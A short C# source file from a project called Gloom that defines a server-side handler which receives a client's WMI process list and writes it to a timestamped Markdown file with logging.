﻿using Gloom.WmiOps;
using Serilog;
using System.Text;

namespace Gloom.Server.Features.InfoCollector.Wmi;
internal class WmiProcessList : WmiInfo
{
	public WmiProcessList() : base("ps", WmiOpCodes.ProcessList)
	{
	}

	public override async Task Handle(Client client, byte[] data)
	{
		var rsp = data.Deserialize<ProcessListResponse>();
		var fileName = $"Process list of {client.Name} at {DateTime.Now:yyyy-MM-dd-HH-mm-ss-ffff}.md";
		try
		{
			using var fw = new StreamWriter(fileName, false, new UTF8Encoding(false), 8192);

			fw.WriteLine("# Processses");
			fw.WriteLine(rsp.List.ToMarkdownTable());
			Log.Information("Process list of {client} written to {path}.", client, fileName);
		}
		catch (Exception ex)
		{
			Log.Error(ex, "Exception during handling of wmi process list response.");
		}
	}
}
